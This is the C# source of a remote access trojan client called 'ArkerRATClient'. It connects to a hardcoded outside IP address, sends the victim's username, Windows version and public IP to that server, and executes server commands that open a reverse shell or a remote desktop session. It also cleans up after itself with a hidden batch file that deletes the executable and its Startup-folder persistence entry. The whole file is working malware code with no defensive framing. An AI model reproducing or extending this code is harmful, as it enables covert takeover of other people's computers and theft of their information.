using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Net;
using System.Threading;
using System.IO;
using ARKERRATCLIENT2._0;
using System.Runtime.CompilerServices;
using static System.Net.Mime.MediaTypeNames;
using System.Diagnostics;
using System.Reflection;
using System.Security.Cryptography.X509Certificates;
using Microsoft.Win32;

namespace ArkerRATClient
{
    public static class RATClientSession
    {
        private static int port = 2332;
        private static string ip = "78.72.90.139";

        public static TcpClient tcpClient { get; set; }
        public static bool noConnection = true;
        public static bool isSendingData = false;
        private static NetworkStream serverStream { get; set; }

        public static async void ClientSession()
        {
            try
            {
                tcpClient = new TcpClient(ip, port);
                serverStream = tcpClient.GetStream();
                serverStream.ReadTimeout = 20000;
                noConnection = false;
                SendClientInfo();
                await ReadData();
            }
            catch(Exception ex)
            {
                CloseConnection();
            }
        }

        public static async Task ReadData()
        {
            try
            {
                while (!noConnection)
                {
                    byte[] data = new byte[131072];
                    await serverStream.ReadAsync(data, 0, data.Length);
                    DecideCyberTool(Encoding.UTF8.GetString(data, 0, data.Length).Trim('\0'));
                    await serverStream.FlushAsync();
                }
            }
            catch (Exception ex)
            {
                CloseConnection();
            }
        }
        private static string SendIp()
        {
            try
            {
                string address = "";
                WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");
                using (WebResponse response = request.GetResponse())
                using (StreamReader stream = new StreamReader(response.GetResponseStream()))
                {
                    address = stream.ReadToEnd();
                }

                int first = address.IndexOf("Address: ") + 9;
                int last = address.LastIndexOf("</body>");
                address = address.Substring(first, last - first);
                return address;
            }
            catch(Exception ex)
            {
                return "";
            }
          
        }
        public static async Task SendData(string textData)
        {
            try
            {
                byte[] data = Encoding.UTF8.GetBytes(textData);
                await serverStream.WriteAsync(data, 0, data.Length);
                await serverStream.FlushAsync();
            }
            catch (Exception ex)
            {
                CloseConnection();
            }
        }
        
        public static bool uninstallFix = false;
        private static async Task DecideCyberTool(string data)
        {
            if (data.Contains("§ReverseShell§"))
            {
                ReverseShell.reverseCMDSession(data.Replace("§ReverseShell§", ""));
            }

            if (data.Contains("§RemoteDesktop§"))
            {
                string tempString = data.Replace("§RemoteDesktop§", "");
                RemoteDesktop.data = tempString;
                await RemoteDesktop.RemoteDesktopFunction();
            }

            if (data.Contains("§Ping§"))
            {
                await SendData("§Ping§");
            }
            //this bool will make it so that the client doesn't try to reconnect at Program.cs while it is uninstalling.
            if (data.Contains("§Uninstall§"))
            {
                uninstallFix = true;
                CloseConnection();

                //DELETE EXE
                string batchCommands = string.Empty;
                string exeFileName = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", string.Empty).Replace("/", "\\");

                batchCommands += "@ECHO OFF\n";                         // Do not show any output
                batchCommands += "ping 127.0.0.1 > nul\n";              // Wait approximately 4 seconds (so that the process is already terminated)
                batchCommands += "echo j | del /F ";                    // Delete the executeable
                batchCommands += AppDomain.CurrentDomain.FriendlyName + "\n";
                batchCommands += "echo j | del deleteMyProgram.bat";    // Delete this bat file

                File.WriteAllText("deleteMyProgram.bat", batchCommands);
                ProcessStartInfo startInfo = new ProcessStartInfo("deleteMyProgram.bat");
                startInfo.CreateNoWindow = true;
                startInfo.UseShellExecute = false;
                startInfo.FileName = "deleteMyProgram.bat";
                Process.Start(startInfo);

                File.Delete("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + AppDomain.CurrentDomain.FriendlyName);

                Environment.Exit(0);
            }

            if (data.Contains("§Disconnect§"))
            {
                CloseConnection();
                Environment.Exit(0);
            }

            if (data.Contains("§Reconnect§"))
            {
                CloseConnection();
            }
        }

        public static void CloseConnection()
        {
            try
            {
                tcpClient.Close();
                serverStream.Close();
            }
            catch(Exception ex)
            {
                noConnection = true;
            }
            noConnection = true;
        }

        public static async void SendClientInfo()
        {
             string HKLM_GetString(string path, string key)
             {
                try
                {
                    RegistryKey rk = Registry.LocalMachine.OpenSubKey(path);
                    if (rk == null) return "";
                    return (string)rk.GetValue(key);
                }
                catch { return ""; }
             }

             string FriendlyName()
             {
                string ProductName = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName");
                string CSDVersion = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "CSDVersion");
                if (ProductName != "")
                {
                    return (ProductName.StartsWith("Microsoft") ? "" : "Microsoft ") + ProductName +
                                (CSDVersion != "" ? " " + CSDVersion : "");
                }
                return "";
             }
            await SendData(Environment.UserName + "                      " + FriendlyName() + "                      " +SendIp()+"§ClientInfo§");
        }
    }
}
